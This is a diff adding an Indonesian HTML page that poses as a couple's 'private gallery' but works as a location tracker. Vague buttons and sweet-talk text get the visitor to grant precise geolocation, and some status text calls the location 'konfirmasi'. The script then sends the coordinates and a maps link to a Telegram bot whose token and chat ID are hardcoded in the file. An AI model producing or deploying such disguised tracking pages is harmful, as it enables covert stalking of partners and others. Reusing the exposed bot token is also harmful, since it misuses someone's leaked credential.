@@ -1,0 +1,275 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Kenzy ❤️ Airaa — Private Gallery</title>
+<style>
+  :root{
+    --accent:#ff9bd2;
+    --bg:#000;
+    --card:#111;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0;
+    min-height:100vh;
+    background:var(--bg);
+    color:#fff;
+    font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    padding:20px;
+  }
+  header{ text-align:center; margin-bottom:14px; }
+  h1{ margin:6px 0; color:var(--accent); font-size:1.6rem; }
+  p.lead{ margin:0; color:#bbb; font-size:.95rem; }
+
+  .gallery{
+    width:100%;
+    max-width:980px;
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(160px,1fr));
+    gap:16px;
+    margin:20px 0;
+  }
+  .photo{
+    background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+    border-radius:18px;
+    padding:10px;
+    border:4px solid rgba(255,255,255,0.02);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    transition:transform .22s ease, box-shadow .22s ease;
+    box-shadow:0 6px 18px rgba(0,0,0,0.6);
+  }
+  .photo:hover{ transform:translateY(-6px) scale(1.02); box-shadow:0 12px 30px rgba(0,0,0,0.7); }
+  .frame{
+    width:100%;
+    border-radius:12px;
+    overflow:hidden;
+    border:6px solid var(--accent);
+    position:relative;
+    background:#000;
+  }
+  .frame img{ display:block; width:100%; height:200px; object-fit:cover; }
+  .caption{
+    position:absolute;
+    left:8px; bottom:8px;
+    background:rgba(0,0,0,0.45);
+    padding:6px 8px;
+    border-radius:8px;
+    font-size:0.85rem;
+    color:#fff;
+  }
+
+  .controls{
+    margin-top:10px;
+    display:flex;
+    gap:10px;
+    flex-wrap:wrap;
+    justify-content:center;
+  }
+  .btn{
+    background:var(--accent);
+    border:none;
+    color:#000;
+    padding:10px 14px;
+    border-radius:20px;
+    font-weight:700;
+    cursor:pointer;
+  }
+  .btn.ghost{
+    background:transparent;
+    border:1px solid rgba(255,255,255,0.08);
+    color:#ddd;
+    font-weight:600;
+  }
+
+  .loc-box{
+    margin-top:12px;
+    background:var(--card);
+    padding:12px 14px;
+    border-radius:12px;
+    border:1px dashed rgba(255,255,255,0.05);
+    color:#ddd;
+    min-width:260px;
+    text-align:center;
+  }
+
+  .small {font-size:0.85rem; color:#bbb; margin-top:8px;}
+  footer{ margin-top:28px; color:#666; font-size:0.82rem; }
+
+  /* modal */
+  .modal-back{ position:fixed; inset:0; display:none; place-content:center; background:rgba(0,0,0,0.6); z-index:40; }
+  .modal{ background:#0e0e0e; padding:18px; border-radius:12px; width:min(420px,92%); color:#eee; box-shadow:0 10px 40px rgba(0,0,0,0.8); }
+  .modal h3{ margin:0 0 8px 0; color:var(--accent); }
+  .modal p{ margin:0 0 12px 0; color:#ccc; }
+  .modal .row{ display:flex; gap:8px; justify-content:flex-end; margin-top:10px; }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>💞 Kenzy & Airaa — Private Gallery</h1>
+  <p class="lead">Background hitam, bingkai lucu. Hanya untuk kalian berdua — jangan di-publish.</p>
+</header>
+
+<section class="gallery" aria-label="Galeri foto">
+  <!-- Ganti src gambar ini dengan link foto kalian atau path lokal -->
+  <div class="photo"><div class="frame"><img src="https://placekitten.com/420/420" alt="Foto 1"><div class="caption">Foto kita 1</div></div></div>
+  <div class="photo"><div class="frame"><img src="https://placekitten.com/421/420" alt="Foto 2"><div class="caption">Foto manis</div></div></div>
+  <div class="photo"><div class="frame"><img src="https://placekitten.com/422/420" alt="Foto 3"><div class="caption">Foto lucu</div></div></div>
+  <div class="photo"><div class="frame"><img src="https://placekitten.com/423/420" alt="Foto 4"><div class="caption">Foto favorit</div></div></div>
+</section>
+
+<div class="controls">
+  <button class="btn" id="btnGet">click ini</button>
+  <button class="btn ghost" id="btnSend" disabled>click lagi ini</button>
+  <button class="btn ghost" id="btnCopy" disabled>salin</button>
+</div>
+
+<div id="loc" class="loc-box">hallo kamu cantik hari ini.</div>
+<div class="small">Catatan: pastikan kamu menekan izinkan yang muncul di saat pertama kali membuka web untuk mengkonfirmasi.</div>
+
+<!-- Modal Konfirmasi -->
+<div id="modalBack" class="modal-back" role="dialog" aria-modal="true">
+  <div class="modal" role="document">
+    <h3>konfirmasi ke my ayang</h3>
+    <p id="modalText">Kirim ke Telegram?</p>
+    <div class="row">
+      <button class="btn ghost" id="modalCancel">Batal</button>
+      <button class="btn" id="modalConfirm">Kirim Sekarang</button>
+    </div>
+  </div>
+</div>
+
+<footer>• Disarankan: jangan taruh file ini di publik •</footer>
+
+<script>
+/*
+  === PENTING ===
+  Jika kamu ingin langsung kirim dari halaman ini (HTML-only),
+  masukkan BOT_TOKEN dan CHAT_ID di variabel di bawah.
+  ⚠️ MENYIMPAN TOKEN DI KODE SISI-KLIEN BERISIKO:
+  - Jangan upload ke publik.
+  - Hanya gunakan jika file benar-benar privat / lokal.
+*/
+const BOT_TOKEN = "8164522673:AAHghwGfRXXBc0Yd2rjMRsWR8ZFJIPu5Lbs"; // contoh: 123456789:ABCDefGh...
+const CHAT_ID   = "6626316127";       // contoh: 987654321  (bisa user id atau id grup)
+
+// ------------- jangan ubah bagian bawah kalau nggak ngerti -------------
+const locBox = document.getElementById('loc');
+const btnGet = document.getElementById('btnGet');
+const btnSend = document.getElementById('btnSend');
+const btnCopy = document.getElementById('btnCopy');
+
+let lastCoords = null;
+
+function setStatus(msg){
+  locBox.textContent = msg;
+}
+
+btnGet.addEventListener('click', () => {
+  if (!navigator.geolocation) {
+    setStatus('Browser tidak mendukung geolokasi.');
+    return;
+  }
+  setStatus('Meminta izin ke myayang… (mohon izinkan)');
+  navigator.geolocation.getCurrentPosition(onPos, onErr, { enableHighAccuracy: true, timeout: 15000 });
+});
+
+function onPos(pos){
+  const lat = Number(pos.coords.latitude).toFixed(6);
+  const lon = Number(pos.coords.longitude).toFixed(6);
+  lastCoords = { lat, lon };
+  setStatus(`📍 Lokasi: ${lat}, ${lon}`);
+  btnSend.disabled = false;
+  btnCopy.disabled = false;
+  btnSend.classList.remove('ghost');
+}
+
+function onErr(e){
+  if (e.code === 1) setStatus('Kamu menolak izin awal pertama masuk web.');
+  else if (e.code === 2) setStatus('konfirmasi tidak tersedia.');
+  else if (e.code === 3) setStatus('Pengambilan konfirmasi timeout.');
+  else setStatus('Gagal mengambil konfirmasi.');
+}
+
+btnCopy.addEventListener('click', () => {
+  if (!lastCoords) return;
+  const txt = `${lastCoords.lat}, ${lastCoords.lon}`;
+  navigator.clipboard?.writeText(txt).then(()=> {
+    setStatus('Koordinat disalin ke clipboard.');
+  }).catch(()=> {
+    setStatus('Gagal salin. Copy manual: ' + txt);
+  });
+});
+
+// Modal flow
+const modalBack = document.getElementById('modalBack');
+const modalText = document.getElementById('modalText');
+const modalCancel = document.getElementById('modalCancel');
+const modalConfirm = document.getElementById('modalConfirm');
+
+btnSend.addEventListener('click', () => {
+  if (!lastCoords) return;
+  modalText.textContent = `Kirim lokasi (${lastCoords.lat}, ${lastCoords.lon}) ke Telegram? Pastikan pasangan sudah setuju.`;
+  modalBack.style.display = 'grid';
+});
+
+modalCancel.addEventListener('click', () => {
+  modalBack.style.display = 'none';
+});
+
+modalConfirm.addEventListener('click', async () => {
+  modalBack.style.display = 'none';
+  await sendToTelegram(lastCoords.lat, lastCoords.lon);
+});
+
+// SEND TO TELEGRAM (client-side)
+// WARNING: This will expose BOT_TOKEN in network requests from the device.
+// Use only if you understand risikonya.
+async function sendToTelegram(lat, lon){
+  if (!BOT_TOKEN || BOT_TOKEN.includes("PUT_YOUR")) {
+    alert("BOT_TOKEN belum diisi. Buka file HTML dan masukkan BOT_TOKEN & CHAT_ID.");
+    return;
+  }
+  if (!CHAT_ID || CHAT_ID.includes("PUT_CHAT")) {
+    alert("CHAT_ID belum diisi. Buka file HTML dan masukkan BOT_TOKEN & CHAT_ID.");
+    return;
+  }
+
+  setStatus('Mengirim ke Telegram…');
+  const text = `📌 Lokasi dari Web Gallery\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
+
+  try {
+    // Gunakan fetch ke Telegram Bot API
+    const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`;
+    const resp = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type':'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text,
+        parse_mode: 'Markdown'
+      })
+    });
+
+    const j = await resp.json();
+    if (resp.ok && j.ok) {
+      setStatus('✅ Lokasi berhasil dikirim ke Telegram.');
+    } else {
+      console.error('tg err', j);
+      setStatus('❌ Gagal kirim ke Telegram: ' + (j.description || 'unknown'));
+    }
+  } catch (err) {
+    console.error(err);
+    setStatus('❌ Terjadi error saat mengirim. Cek koneksi atau token.');
+  }
+}
+</script>
+</body>
+</html>
